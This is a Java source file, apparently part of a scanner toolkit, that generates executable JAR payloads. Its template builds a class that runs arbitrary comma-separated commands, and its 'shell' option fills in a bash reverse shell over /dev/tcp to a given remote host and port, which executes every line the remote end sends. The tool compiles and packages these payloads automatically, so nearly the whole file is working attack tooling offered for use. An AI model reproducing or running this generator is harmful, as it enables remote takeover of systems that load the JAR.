package com.gbw.scanner.tools;

import com.gbw.scanner.utils.FileUtils;
import org.apache.commons.cli.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class GBWScannerGenShellJar {


    private static String runCmdTemplate = "  \n" +
            "            package mygbw.attack;  \n" +
            "            import java.io.InputStream;\n" +
            "            import java.util.ArrayList;\n" +
            "            import java.util.List;\n" +
            "                       \n" +
            "            public class %s {\n" +
            "                public %s() {\n" +
            "                }\n" +
            "                                \n" +
            "                private static String doShell(List<String> cmd) throws Exception{\n" +
            "                    StringBuffer sb = new StringBuffer();\n" +
            "                    byte[] buffer = new byte[1024];\n" +
            "                    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n" +
            "                    processBuilder.redirectErrorStream(true);\n" +
            "                    Process process = processBuilder.start();\n" +
            "                    InputStream stream = process.getInputStream();\n" +
            "                       \n" +
            "                    while(stream.read(buffer) != -1) {\n" +
            "                        sb.append(new String(buffer));\n" +
            "                    }\n" +
            "                       \n" +
            "                    stream.close();\n" +
            "                    if (process.isAlive()) {\n" +
            "                        process.waitFor();\n" +
            "                    }\n" +
            "                       \n" +
            "                    return sb.toString();\n" +
            "                }\n" +
            "                                                  \n" +
            "                public static void main(String[] args) throws Exception {\n" +
            "         \n" +
            "                   String[] cmds = \"%s\".split(\",\");\n" +
            "                   List<String> cmdList = new ArrayList<>();\n" +
            "                   for(String c:cmds){\n" +
            "                       cmdList.add(c);\n" +
            "                   }\n" +
            "                   \n" +
            "                  doShell(cmdList); \n" +
            "        \n" +
            "                }\n" +
            "            }";

    private static String JAR_MAINFILE_TEMPLATE = "Manifest-Version: 1.0\n" +
            "Archiver-Version: Plexus Archiver\n" +
            "Created-By: Apache Maven 3.6.0\n" +
            "Built-By: root\n" +
            "Build-Jdk: 13.0.1\n" +
            "Main-Class: mygbw.attack.%s\n";


    private static String getshellTemplate = "/bin/bash,-c,exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done";


    private static String JarFilePath = "/tmp/jar/";

    private static String getJarFilePath(){

        return String.format("/tmp/jar/%d/",System.currentTimeMillis());
    }

    private static String executeCommand(String command) {

        StringBuilder output = new StringBuilder();

        try {
            Process p = Runtime.getRuntime().exec(command);
            p.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line;
            while((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return output.toString();
    }

    public static String toJar(String jclass,String cmd,boolean isMove) throws IOException {

        String path = getJarFilePath();
        String ppath = "mygbw/attack";
        String java = String.format("%s/%s.java",ppath,jclass);
        String jclassPath = String.format("%s/%s.class",ppath,jclass);
        String meta = "META-INF/MANIFEST.MF";
        String jar = String.format("%s.jar",jclass);
        String compileCmd = String.format("javac %s",java);
        String jarCmd = String.format("jar -cvfm %s %s %s",jar,meta,jclassPath);
        String targetJar = String.format("%s%s",path,jar);

        String metaContent = String.format(JAR_MAINFILE_TEMPLATE,jclass);
        String javaContent = String.format(runCmdTemplate,jclass,jclass,cmd);

        FileUtils.write(java,javaContent.getBytes());
        FileUtils.write(meta,metaContent.getBytes());

        executeCommand(compileCmd);
        executeCommand(jarCmd);

        executeCommand("rm -rf "+"mygbw"+" "+"META-INF");

        //FileUtils.delete(jclassPath);

        if(isMove)
            FileUtils.move(jar,targetJar);

        return isMove?targetJar:jar;
    }

    public static String toShellJar(String jclass,String rhost,int rport,boolean isMove) throws IOException {

        String cmd = String.format(getshellTemplate,rhost,rport);
        return toJar(jclass,cmd,isMove);
    }

    public static void main(String[] args) throws ParseException, IOException {

        boolean isMove = false;

        Options opts = new Options();

        opts.addOption("jclass",true,"set java class name");
        opts.addOption("cmd",true,"set will run cmd");
        opts.addOption("shell",true,"make shell,args:<rhost>:<rport>");
        opts.addOption("isMove",false,"move jar to target or not");
        opts.addOption("help", false, "Print usage");

        CommandLine cliParser = new GnuParser().parse(opts, args);
        if(cliParser.hasOption("help")){

            new HelpFormatter().printHelp("GBWScannerGenShellJar:", opts);
            System.exit(0);
        }

        if(!cliParser.hasOption("jclass")){

            System.err.println("Please specify java class name");
            System.exit(-1);
        }

        String jclass = cliParser.getOptionValue("jclass");

        if(cliParser.hasOption("isMove"))
            isMove = true;

        if(cliParser.hasOption("cmd")){

            System.out.println(toJar(jclass,cliParser.getOptionValue("cmd"),isMove));
        }

        if(cliParser.hasOption("shell")){
            String[] splits = cliParser.getOptionValue("shell").split(":");
            System.out.println(toShellJar(jclass,splits[0],Integer.parseInt(splits[1]),isMove));
        }

    }

}
